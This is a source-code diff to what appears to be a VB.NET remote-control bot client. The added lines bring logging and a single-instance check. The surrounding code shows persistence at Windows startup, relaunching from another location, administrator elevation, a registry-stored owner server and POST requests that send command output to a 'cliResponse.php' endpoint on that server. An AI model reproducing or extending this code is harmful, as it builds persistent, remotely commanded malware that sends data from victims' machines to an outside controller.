@@ -67,6 +67,7 @@ Module Memory
     Public UID As String
     Sub SaveRegedit()
         Try
+            AddToLog("SaveRegedit@Memory", "Saving data...", False)
             regKey.SetValue("UID", UID, RegistryValueKind.String)
             LoadRegedit()
         Catch ex As Exception
@@ -75,6 +76,7 @@ Module Memory
     End Sub
     Sub LoadRegedit()
         Try
+            AddToLog("LoadRegedit@Memory", "Loading data...", False)
             OwnerServer = regKey.GetValue("OwnerServer")
             UID = regKey.GetValue("UID")
             HttpOwnerServer = "http://" & OwnerServer
@@ -89,6 +91,8 @@ Module StartUp
         Try
             'Iniciar desde otra ubicacion
             RunFromLocation()
+            'Evita multi-instancias
+            OnlyOneInstance()
             'Iniciar con Windows
             StartWithWindows()
             'Iniciar con Administrador
@@ -123,6 +127,20 @@ Module StartUp
             End If
         Catch ex As Exception
             AddToLog("Init@StartUp", "Error: " & ex.Message, True)
+        End Try
+    End Sub
+    Sub OnlyOneInstance()
+        Try
+            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
+            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
+            If p.Count > 1 Then
+                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
+                End
+            Else
+                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
+            End If
+        Catch ex As Exception
+            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub RunFromLocation()
@@ -375,6 +393,7 @@ Module Network
     End Sub
     Sub SendCommandResponse(Optional ByVal CMDResponse As String = Nothing)
         Try
+            AddToLog("SendCommandResponse@Network", "Sending: " & CMDResponse, False)
             Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
             request.Method = "POST"
             Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
@@ -615,6 +634,7 @@ Module Network
                         End If
                     Catch ex As Exception
                         CommandResponse = "[" & CMD1 & "]Error: " & ex.Message
+                        AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
                     End Try
                     If CMD1 = Nothing Then
                     Else
